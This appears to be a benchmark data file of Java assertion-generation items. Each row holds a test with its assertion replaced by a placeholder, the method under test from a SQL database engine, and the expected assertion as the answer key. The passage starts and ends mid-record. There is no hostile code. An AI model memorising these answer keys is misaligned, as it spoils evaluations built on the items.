long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 63774994332L)
"testUnixTimestamp() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f = PartitionFieldBuilder.createField(fieldType); f.store(""2020-12-12 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.UNIX_TIMESTAMP, null); long res = function.evalInt(f, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 1607746332L)
"testMonth() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f = PartitionFieldBuilder.createField(fieldType); f.store(""2020-12-12 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.MONTH, null); long res = function.evalInt(f, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 12L)
"testDayOfMonth() { DataType fieldType = new DateTimeType(5); DataType resultType = new VarcharType(); PartitionField f1 = PartitionFieldBuilder.createField(fieldType); f1.store(""2020-12-31 12:12:12"", resultType);  PartitionIntFunction function = PartitionFunctionBuilder.create(TddlOperatorTable.DAYOFMONTH, null); long res = function.evalInt(f1, SessionProperties.empty()); Assert.""<AssertPlaceHolder>""; }
evalInt(PartitionField partitionField, SessionProperties sessionProperties);  /** * Convert ""func_arg $CMP$ const"" half-interval into ""FUNC(func_arg) $CMP2$ const2"" * <p> * SYNOPSIS * val_int_endpoint() * left_endp  FALSE  <=> The interval is ""x < const"" or ""x <= const"" * TRUE   <=> The interval is ""x > const"" or ""x >= const"" * <p> * incl_endp  IN   FALSE <=> the comparison is '<' or '>' * TRUE  <=> the comparison is '<=' or '>=' * OUT  The same but for the ""F(x) $CMP$ F(const)"" comparison * <p> * DESCRIPTION * This function is defined only for unary monotonic functions. The caller * supplies the source half-interval * <p> * x $CMP$ const * <p> * The value of const is supplied implicitly as the value this item's * argument, the form of $CMP$ comparison is specified through the * function's arguments. The calle returns the result interval * <p> * F(x) $CMP2$ F(const) * <p> * passing back F(const) as the return value, and the form of $CMP2$ * through the out parameter. NULL values are assumed to be comparable and * be less than any non-NULL values. * * @param endpoints left_endp = endpoints[0], incl_endp = endpoints[1]. * @return The output range bound, which equal to the value of val_int(). If the value of the function is NULL then the bound is the smallest possible value of LLONG_MIN */ abstract public long evalIntEndpoint(PartitionField partitionField, SessionProperties sessionProperties, boolean[] endpoints);  /** * eval object by the input of full params fields */ public Object evalEndpoint(List<PartitionField> allParamsFields, SessionProperties sessionProperties, boolean[] booleans) { throw new NotSupportException(); }"	assertTrue(res == 31L)
"TestCreateFkTableWithoutName() { List<ForeignKeyData> fks = new ArrayList<>(); ForeignKeyData fk1 = new ForeignKeyData(""test"", ""device"", ""device_ibfk_1"", ""device_ibfk_1"", Collections.singletonList(""b""), ""test"", ""user2"", Collections.singletonList(""b""), null, null); ForeignKeyData fk2 = new ForeignKeyData(""test"", ""device"", ""device_ibfk_2"", ""fk"", Collections.singletonList(""b""), ""test"", ""user2"", Collections.singletonList(""b""), null, null); ForeignKeyData fk3 = new ForeignKeyData(""test"", ""device"", ""my_ibfk"", ""my_ibfk"", Collections.singletonList(""b""), ""test"", ""user2"", Collections.singletonList(""c""), null, null); ForeignKeyData fk4 = new ForeignKeyData(""test"", ""device"", ""my_ibfk_1"", ""my_ibfk_1"", Collections.singletonList(""c""), ""test"", ""user2"", Collections.singletonList(""c""), null, null); ForeignKeyData fk5 = new ForeignKeyData(""test"", ""device"", ""device_ibfk_3"", ""device_ibfk_3"", Collections.singletonList(""c""), ""test"", ""user2"", Collections.singletonList(""c""), null, null); ForeignKeyData fk6 = new ForeignKeyData(""test"", ""device"", ""device_ibfk_4"", ""device_ibfk_4"", Collections.singletonList(""c""), ""test"", ""device"", Collections.singletonList(""c""), null, null); ForeignKeyData fk7 = new ForeignKeyData(""test"", ""device"", ""fk_device_user"", ""fk_device_user"", Arrays.asList(""b"", ""c"", ""d""), ""test"", ""user2"", Arrays.asList(""b"", ""c"", ""d""), null, null); ForeignKeyData fk8 = new ForeignKeyData(""test"", ""device"", ""device_ibfk_5"", ""device_ibfk_5"", Arrays.asList(""b"", ""c"", ""d""), ""test"", ""user2"", Arrays.asList(""b"", ""c"", ""d""), null, null); fks.add(fk1); fks.add(fk2); fks.add(fk3); fks.add(fk4); fks.add(fk5); fks.add(fk6); fks.add(fk7); fks.add(fk8);  String createTableSql = ""CREATE TABLE IF NOT EXISTS device ("" + ""  a INT PRIMARY KEY AUTO_INCREMENT,"" + ""  b INT NOT NULL,"" + ""  c INT NOT NULL,"" + ""  d INT NOT NULL,"" + ""  KEY `device_ibfk_1` (`b`),"" + ""  foreign key (`b`) REFERENCES `user2` (`a`),\n"" + ""  foreign key `fk` (`b`) REFERENCES `user2` (`b`),\n"" + ""  constraint `my_ibfk` foreign key (`b`) REFERENCES `user2` (`c`),\n"" + ""  constraint `my_ibfk_1` foreign key `fk1` (`c`) REFERENCES `user2` (`c`),\n"" + ""  foreign key (`c`) REFERENCES `user2` (`c`) ON DELETE CASCADE ON UPDATE CASCADE,\n"" + ""  foreign key (`d`) REFERENCES `device` (`c`),\n"" + ""  constraint `fk_device_user` foreign key (`b` , `c` , `d`)\n"" + ""       REFERENCES `user2` (`b` , `c` , `d`)\n"" + ""  foreign key (`b` , `c` , `d`)\n"" + ""       REFERENCES `user2` (`b` , `c` , `d`)\n"" + "") SINGLE ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;"";  String modifiedSql = ForeignKeyUtils.addForeignKeyConstraints(createTableSql, fks); Assert.""<AssertPlaceHolder>"";""); }
addForeignKeyConstraints(String createTableSql, List<ForeignKeyData> fks) { // 用于匹配所有外键定义的正则表达式（不管是否有命名） Pattern fkPattern = Pattern.compile( ""FOREIGN\\s+KEY\\s+`?\\w*`?\\s*\\((?:\\s*`?\\w+`?\\s*,?)+\\)\\s+REFERENCES\\s+`?\\w+`?\\s*\\((?:\\s*`?\\w+`?\\s*,?)+\\)\\s*,?"", Pattern.CASE_INSENSITIVE);  Matcher fkMatcher = fkPattern.matcher(createTableSql); StringBuffer buffer = new StringBuffer(); int fkIndex = 0;  Pattern namedConstraintPattern = Pattern.compile( ""CONSTRAINT\\s+`?\\w*`?\\s*$"", Pattern.CASE_INSENSITIVE); // 正确转义反引号，并从字符串末尾匹配  while (fkMatcher.find()) { int start = fkMatcher.start(); String substringBeforeFk = createTableSql.substring(0, start); Matcher namedConstraintMatcher = namedConstraintPattern.matcher(substringBeforeFk); // 用于判断当前外键是否已经被命名 boolean isNamed = namedConstraintMatcher.find();  String fkConstraint = fkMatcher.group(); String constraintName; if (!isNamed && fkIndex < fks.size()) { // 外键未命名，从 fks 列表中获取约束名 constraintName = fks.get(fkIndex++).constraint; // 替换未命名的外键定义，加上约束名 fkMatcher.appendReplacement(buffer, ""CONSTRAINT `"" + constraintName + ""` "" + fkConstraint); } else if (isNamed) { // 外键已被命名，跳过命名过程 fkIndex++; fkMatcher.appendReplacement(buffer, Matcher.quoteReplacement(fkConstraint)); } else { // 没有更多的外键约束名可用 throw new IllegalStateException(""Not enough constraint names provided for all unnamed foreign keys""); } } fkMatcher.appendTail(buffer); return buffer.toString(); }"	"assertEquals(modifiedSql, ""CREATE TABLE IF NOT EXISTS device ("" + ""  a INT PRIMARY KEY AUTO_INCREMENT,"" + ""  b INT NOT NULL,"" + ""  c INT NOT NULL,"" + ""  d INT NOT NULL,"" + ""  KEY `device_ibfk_1` (`b`),"" + ""  CONSTRAINT `device_ibfk_1` foreign key (`b`) REFERENCES `user2` (`a`),\n"" + ""  CONSTRAINT `device_ibfk_2` foreign key `fk` (`b`) REFERENCES `user2` (`b`),\n"" + ""  constraint `my_ibfk` foreign key (`b`) REFERENCES `user2` (`c`),\n"" + ""  constraint `my_ibfk_1` foreign key `fk1` (`c`) REFERENCES `user2` (`c`),\n"" + ""  CONSTRAINT `device_ibfk_3` foreign key (`c`) REFERENCES `user2` (`c`) ON DELETE CASCADE ON UPDATE CASCADE,\n"" + ""  CONSTRAINT `device_ibfk_4` foreign key (`d`) REFERENCES `device` (`c`),\n"" + ""  constraint `fk_device_user` foreign key (`b` , `c` , `d`)\n"" + ""       REFERENCES `user2` (`b` , `c` , `d`)\n"" + ""  CONSTRAINT `device_ibfk_5` foreign key (`b` , `c` , `d`)\n"" + ""       REFERENCES `user2` (`b` , `c` , `d`)\n"" + "") SINGLE ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"
"testBoolToLiteral() {  try {  final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  { SqlTypeName sqlTypeName = SqlTypeName.BOOLEAN; RelDataType relDataType = typeFactory.createSqlType(sqlTypeName); Object obj = new Boolean(true); RexLiteral node = RexLiteralTypeUtils.convertJavaObjectToRexLiteral(obj, relDataType, sqlTypeName, builder); Assert.""<AssertPlaceHolder>""; } } catch (Throwable e) { e.printStackTrace(); ; Assert.fail(); }  }
convertJavaObjectToRexLiteral(Object value, RelDataType type, SqlTypeName typeName, RexBuilder rexBuilder) {  Object rexLiterValObj = null; switch (typeName) { case TINYINT: case SMALLINT: case INTEGER: case BIGINT: case DECIMAL: case INTERVAL_YEAR: case INTERVAL_YEAR_MONTH: case INTERVAL_MONTH: case INTERVAL_DAY: case INTERVAL_DAY_HOUR: case INTERVAL_DAY_MINUTE: case INTERVAL_DAY_SECOND: case INTERVAL_HOUR: case INTERVAL_HOUR_MINUTE: case INTERVAL_HOUR_SECOND: case INTERVAL_MINUTE: case INTERVAL_MINUTE_SECOND: case INTERVAL_SECOND:  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).longValue());  } break;  case FLOAT:  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).doubleValue(), MathContext.DECIMAL32) .stripTrailingZeros(); }  break;  case REAL: case DOUBLE: // return BigDecimal  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).doubleValue(), MathContext.DECIMAL64) .stripTrailingZeros(); }  break;  case CHAR: case VARCHAR: // return NlsString  if (value instanceof NlsString) { rexLiterValObj = value; } else if (value instanceof Slice){ rexLiterValObj = ((Slice) value).toStringUtf8(); } else { rexLiterValObj = new NlsString((String) value, type.getCharset().name(), type.getCollation()); } break;  case BINARY: case VARBINARY: // return ByteString  if (value instanceof byte[]) { rexLiterValObj = new ByteString((byte[]) value); } else if (value instanceof ByteString) { rexLiterValObj = value; }  break;  case TIME: // return TimeString // Calendar -> TimeString // Integer -> TimeString  if (value instanceof String) { rexLiterValObj = new TimeString((String) value); } else if (value instanceof TimeString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimeString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimeString.fromMillisOfDay((Integer) value); } break;  case TIME_WITH_LOCAL_TIME_ZONE: // return TimeString // Integer -> TimeString  if (value instanceof String) { rexLiterValObj = new TimeString((String) value); } else if (value instanceof TimeString) { rexLiterValObj = value; } else { rexLiterValObj = TimeString.fromMillisOfDay((Integer) value);  }  break;  case DATE: // return DateString // Calendar -> DateString // Date -> DateString // Integer -> DateString  if (value instanceof String) { rexLiterValObj = new DateString((String) value); } else if (value instanceof Calendar) { rexLiterValObj = DateString.fromCalendarFields((Calendar) value); } else if (value instanceof java.sql.Date) { Calendar c = Calendar.getInstance(); c.setTime(new java.util.Date(((java.sql.Date) value).getTime())); rexLiterValObj = DateString.fromCalendarFields(c); } else { rexLiterValObj = DateString.fromDaysSinceEpoch((Integer) value); }  break;  case DATETIME: // return TimestampString // Calendar -> TimestampString // Long -> TimestampString  // convert DATETIME to TIMESTAMP type = rexBuilder.getTypeFactory().createSqlType(SqlTypeName.TIMESTAMP);  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimestampString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); }  break;  case TIMESTAMP: // return TimestampString // Calendar -> TimestampString // Long -> TimestampString  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimestampString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); }  break;  case TIMESTAMP_WITH_LOCAL_TIME_ZONE: // return TimestampString // Long -> TimestampString  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); } break;  default: rexLiterValObj = value; } RexLiteral rexNode = (RexLiteral) rexBuilder.makeLiteral(rexLiterValObj, type, true); return rexNode; }"	assertEquals(node.getValue(), true)
"testDateToLiteral() {  try { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  { SqlTypeName sqlTypeName = SqlTypeName.DATE; RelDataType relDataType = typeFactory.createSqlType(sqlTypeName); Object obj = new String(""2019-02-28""); RexLiteral node = RexLiteralTypeUtils.convertJavaObjectToRexLiteral(obj, relDataType, sqlTypeName, builder);  SimpleDateFormat sdf = new SimpleDateFormat(""yyyy-MM-dd""); String timeFormatStr = sdf.format(((Calendar) node.getValue()).getTime());  Assert.""<AssertPlaceHolder>""; }  } catch (Throwable e) { e.printStackTrace(); Assert.fail(); }  }
convertJavaObjectToRexLiteral(Object value, RelDataType type, SqlTypeName typeName, RexBuilder rexBuilder) {  Object rexLiterValObj = null; switch (typeName) { case TINYINT: case SMALLINT: case INTEGER: case BIGINT: case DECIMAL: case INTERVAL_YEAR: case INTERVAL_YEAR_MONTH: case INTERVAL_MONTH: case INTERVAL_DAY: case INTERVAL_DAY_HOUR: case INTERVAL_DAY_MINUTE: case INTERVAL_DAY_SECOND: case INTERVAL_HOUR: case INTERVAL_HOUR_MINUTE: case INTERVAL_HOUR_SECOND: case INTERVAL_MINUTE: case INTERVAL_MINUTE_SECOND: case INTERVAL_SECOND:  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).longValue());  } break;  case FLOAT:  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).doubleValue(), MathContext.DECIMAL32) .stripTrailingZeros(); }  break;  case REAL: case DOUBLE: // return BigDecimal  if (value instanceof BigDecimal) { rexLiterValObj = value; } else { rexLiterValObj = new BigDecimal(((Number) value).doubleValue(), MathContext.DECIMAL64) .stripTrailingZeros(); }  break;  case CHAR: case VARCHAR: // return NlsString  if (value instanceof NlsString) { rexLiterValObj = value; } else if (value instanceof Slice){ rexLiterValObj = ((Slice) value).toStringUtf8(); } else { rexLiterValObj = new NlsString((String) value, type.getCharset().name(), type.getCollation()); } break;  case BINARY: case VARBINARY: // return ByteString  if (value instanceof byte[]) { rexLiterValObj = new ByteString((byte[]) value); } else if (value instanceof ByteString) { rexLiterValObj = value; }  break;  case TIME: // return TimeString // Calendar -> TimeString // Integer -> TimeString  if (value instanceof String) { rexLiterValObj = new TimeString((String) value); } else if (value instanceof TimeString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimeString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimeString.fromMillisOfDay((Integer) value); } break;  case TIME_WITH_LOCAL_TIME_ZONE: // return TimeString // Integer -> TimeString  if (value instanceof String) { rexLiterValObj = new TimeString((String) value); } else if (value instanceof TimeString) { rexLiterValObj = value; } else { rexLiterValObj = TimeString.fromMillisOfDay((Integer) value);  }  break;  case DATE: // return DateString // Calendar -> DateString // Date -> DateString // Integer -> DateString  if (value instanceof String) { rexLiterValObj = new DateString((String) value); } else if (value instanceof Calendar) { rexLiterValObj = DateString.fromCalendarFields((Calendar) value); } else if (value instanceof java.sql.Date) { Calendar c = Calendar.getInstance(); c.setTime(new java.util.Date(((java.sql.Date) value).getTime())); rexLiterValObj = DateString.fromCalendarFields(c); } else { rexLiterValObj = DateString.fromDaysSinceEpoch((Integer) value); }  break;  case DATETIME: // return TimestampString // Calendar -> TimestampString // Long -> TimestampString  // convert DATETIME to TIMESTAMP type = rexBuilder.getTypeFactory().createSqlType(SqlTypeName.TIMESTAMP);  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimestampString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); }  break;  case TIMESTAMP: // return TimestampString // Calendar -> TimestampString // Long -> TimestampString  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else if (value instanceof Calendar) { rexLiterValObj = TimestampString.fromCalendarFields((Calendar) value); } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); }  break;  case TIMESTAMP_WITH_LOCAL_TIME_ZONE: // return TimestampString // Long -> TimestampString  if (value instanceof String) { rexLiterValObj = new TimestampString((String) value); } else if (value instanceof TimestampString) { rexLiterValObj = value; } else { rexLiterValObj = TimestampString.fromMillisSinceEpoch((Long) value); } break;  default: rexLiterValObj = value; } RexLiteral rexNode = (RexLiteral) rexBuilder.makeLiteral(rexLiterValObj, type, true); return rexNode; }"	"assertEquals(timeFormatStr, ""2019-02-28"")"
"testDateTimeToLiteral() {  try { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  { SqlTypeName sqlTypeName = SqlTypeName.DATETIME; RelDataType relDataType = typeFactory.createSqlType(sqlTypeName); Object obj = new String(""2019-02-28 20:00:00""); RexLiteral node = RexLiteralTypeUtils.convertJavaObjectToRexLiteral(obj, relDataType, sqlTypeName, builder);  SimpleDateFormat sdf = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss""); String timeFormatStr = (String) RexLiteralTypeUtils.getJavaObjectFromRexLiteral(node, true);  Assert.""<AssertPlaceHolder>"";  }  } catch (Throwable e) { e.printStackTrace(); Assert.fail(); } }
getJavaObjectFromRexLiteral(RexLiteral rexLiteral, boolean convertTimeToString) {  SqlTypeName typeName = rexLiteral.getTypeName(); Object javaObjOfLiteral = null; switch (typeName) { case TINYINT: case TINYINT_UNSIGNED: case SMALLINT: case SMALLINT_UNSIGNED: case MEDIUMINT: case MEDIUMINT_UNSIGNED: case INTEGER: case SIGNED: { Integer integerValue = (Integer) rexLiteral.getValue(); javaObjOfLiteral = integerValue; } break; case UNSIGNED: case INTEGER_UNSIGNED: case BIGINT: { Long longValue = (Long) rexLiteral.getValue(); javaObjOfLiteral = longValue; } break; case BIGINT_UNSIGNED: { BigInteger bigIntegerValue = (BigInteger) rexLiteral.getValue(); javaObjOfLiteral = bigIntegerValue; } break; case DECIMAL: { final BigDecimal bigDecimal = (BigDecimal) rexLiteral.getValue(); javaObjOfLiteral = bigDecimal; } break; case INTERVAL_YEAR: case INTERVAL_YEAR_MONTH: case INTERVAL_MONTH: case INTERVAL_DAY: case INTERVAL_DAY_HOUR: case INTERVAL_DAY_MINUTE: case INTERVAL_DAY_SECOND: case INTERVAL_HOUR: case INTERVAL_HOUR_MINUTE: case INTERVAL_HOUR_SECOND: case INTERVAL_MINUTE: case INTERVAL_MINUTE_SECOND: case INTERVAL_SECOND: { BigDecimal bigDecimal = (BigDecimal) rexLiteral.getValue(); javaObjOfLiteral = bigDecimal.longValue(); } break;  case FLOAT: { BigDecimal bigDecimal = (BigDecimal) rexLiteral.getValue(); javaObjOfLiteral = bigDecimal.floatValue(); }  break;  case REAL: case DOUBLE: // return BigDecimal  { BigDecimal bigDecimal = (BigDecimal) rexLiteral.getValue(); javaObjOfLiteral = bigDecimal.doubleValue(); }  break;  case CHAR: case VARCHAR: // return NlsString { NlsString nlsStr = (NlsString) rexLiteral.getValue(); javaObjOfLiteral = nlsStr.getValue(); } break;  case BINARY: case VARBINARY: // return ByteString { ByteString byStr = (ByteString) rexLiteral.getValue(); javaObjOfLiteral = byStr.getBytes(); }  break;  case TIME: case DATE: case TIMESTAMP: { if (convertTimeToString) { javaObjOfLiteral = rexLiteral.toString(); } else { Calendar calendar = (Calendar) rexLiteral.getValue(); javaObjOfLiteral = calendar; } } break;  case DATETIME: case TIMESTAMP_WITH_LOCAL_TIME_ZONE: {  if (convertTimeToString) { javaObjOfLiteral = rexLiteral.toString(); } else { Calendar calendar = ((TimestampString) rexLiteral.getValue()).toCalendar(); javaObjOfLiteral = calendar; }  } break;  case TIME_WITH_LOCAL_TIME_ZONE: {  if (convertTimeToString) { javaObjOfLiteral = rexLiteral.toString(); } else { Calendar calendar = ((TimeString) rexLiteral.getValue()).toCalendar(); javaObjOfLiteral = calendar; } } break;  default: javaObjOfLiteral = rexLiteral.getValue(); break; }  return javaObjOfLiteral; }"	"assertEquals(timeFormatStr, ""2019-02-28 20:00:00"")"
"fetchKeywordTest1() { String sql = ""select * from `busu` where id = '1' and name = 'dingfeng' ""; List<String> expectList = Lists .newArrayList(""select"", ""*"", ""from"", ""`busu`"", ""where"", ""id"", ""="", ""'1'"", ""and"", ""name"", ""="", ""'dingfeng'""); List<String> actualList = SqlKeywordMatchUtils.fetchWords(sql); Assert.""<AssertPlaceHolder>""; }
fetchWords(String sql) { if (StringUtils.isBlank(sql)) { return Collections.EMPTY_LIST; } List<String> words = Lists.newArrayList(); MyMySqlLexer lexer = new MyMySqlLexer(sql); do { lexer.nextToken(); String word = stringVal(lexer); if (StringUtils.isNotBlank(word)) { words.add(word); } } while (!lexer.isEOF()); return words; }"	assertEquals(expectList, actualList)
"testMergeFixPlanExceedMaxPlanSize() { BaselineInfo b1 = new BaselineInfo(""test sql"", Collections.emptySet()); BaselineInfo b2 = new BaselineInfo(""test sql"", Collections.emptySet());  b1.addAcceptedPlan(buildFixPlan()); b1.addAcceptedPlan(buildFixPlan()); b1.addAcceptedPlan(buildFixPlan()); b1.addAcceptedPlan(buildPlan()); b1.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildFixPlan()); b2.addAcceptedPlan(buildPlan()); b2.addAcceptedPlan(buildPlan()); b2.addAcceptedPlan(buildPlan()); b2.merge(""test"", b1); System.out.println(b2.getAcceptedPlans().size()); Assert.""<AssertPlaceHolder>""; }
getAcceptedPlans() { return acceptedPlans; }"	assertTrue(b2.getFixPlans().size() == 12 && b2.getAcceptedPlans().size() == 12)
"testTableSetSerialized() { Set<Pair<String, String>> tableSet = Sets.newHashSet(); tableSet.add(Pair.of(null, ""xxa""));  String json = BaselineInfo.serializeTableSet(tableSet); Set<Pair<String, String>> deserializedTableSet = BaselineInfo.deserializeTableSet(json); System.out.println(deserializedTableSet); Assert.""<AssertPlaceHolder>""; }
deserializeTableSet(String jsonString) { Set<Pair<String, String>> tableSet = new HashSet<>(); JSONArray jsonArray = JSON.parseArray(jsonString); for (int i = 0; i < jsonArray.size(); i++) { JSONObject o = jsonArray.getJSONObject(i); tableSet.add(Pair.of(o.getString(""key""), o.getString(""value""))); } return tableSet; }"	assertTrue(deserializedTableSet.iterator().next().getKey() == null)
"testUnparserOriginSqlWithSubPart3_k_k_tp() { String content = ""create table if not exists k_k_tp6 ( "" + ""a bigint unsigned not null, "" + ""b bigint unsigned not null, "" + ""c datetime NOT NULL, "" + ""d varchar(16) NOT NULL, "" + ""e varchar(16) NOT NULL ) "" + ""partition by key (c,d) partitions 3 subpartition by key (a,b) "" + ""( "" + ""subpartition sp1 values less than (0,9223372036854775807), "" + ""subpartition sp2 values less than (3,9223372036854775807), "" + ""subpartition sp3 values less than (4611686018427387905,9223372036854775807), "" + ""subpartition sp4 values less than (9223372036854775807,9223372036854775807) ) "" + ""( "" + ""partition p1 values less than (3,9223372036854775807), "" + ""partition p2 values less than (4611686018427387905,9223372036854775807), "" + ""partition p3 values less than (9223372036854775807,9223372036854775807) )"";  String expectResult = ""CREATE TABLE IF NOT EXISTS k_k_tp6 (\n"" + ""\ta bigint UNSIGNED NOT NULL,\n"" + ""\tb bigint UNSIGNED NOT NULL,\n"" + ""\tc datetime NOT NULL,\n"" + ""\td varchar(16) NOT NULL,\n"" + ""\te varchar(16) NOT NULL\n"" + "")\n"" + ""PARTITION BY KEY (c, d) PARTITIONS 3\n"" + ""SUBPARTITION BY KEY (a, b) (\n"" + ""\tSUBPARTITION sp1 VALUES LESS THAN (0, 9223372036854775807), \n"" + ""\tSUBPARTITION sp2 VALUES LESS THAN (3, 9223372036854775807), \n"" + ""\tSUBPARTITION sp3 VALUES LESS THAN (4611686018427387905, 9223372036854775807), \n"" + ""\tSUBPARTITION sp4 VALUES LESS THAN (9223372036854775807, 9223372036854775807)\n"" + "") (\n"" + ""\tPARTITION p1 VALUES LESS THAN (3, 9223372036854775807), \n"" + ""\tPARTITION p2 VALUES LESS THAN (4611686018427387905, 9223372036854775807), \n"" + ""\tPARTITION p3 VALUES LESS THAN (9223372036854775807, 9223372036854775807)\n"" + "")"";  SQLUtils.FormatOption defaultFormatOption = SQLUtils.DEFAULT_FORMAT_OPTION; SQLUtils.DEFAULT_FORMAT_OPTION = new SQLUtils.FormatOption( VisitorFeature.OutputUCase, VisitorFeature.OutputPrettyFormat, VisitorFeature.OutputHashPartitionsByRange);  MySqlStatementParser parser = new MySqlStatementParser(ByteString.from(content)); List<SQLStatement> parseResult = parser.parseStatementList(); SQLStatement stmt = parseResult.get(0); String unparseSql = stmt.toString(); Assert.""<AssertPlaceHolder>""; System.out.println(unparseSql);  SQLUtils.DEFAULT_FORMAT_OPTION = defaultFormatOption; }
parseStatementList() { List<SQLStatement> statementList = new ArrayList<SQLStatement>(); parseStatementList(statementList, -1, null); return statementList; }"	assertEquals(expectResult, unparseSql)
"testCreateSequence() { String sql = ""create sequence pxc_seq_64056c9e413d6f79544c4938f86c8d6e start with 1 cache 100000""; repository.console(sql, FEATURES); SchemaObject object = findSequence(repository, ""pxc_seq_64056c9e413d6f79544c4938f86c8d6e""); Assert.""<AssertPlaceHolder>""; }
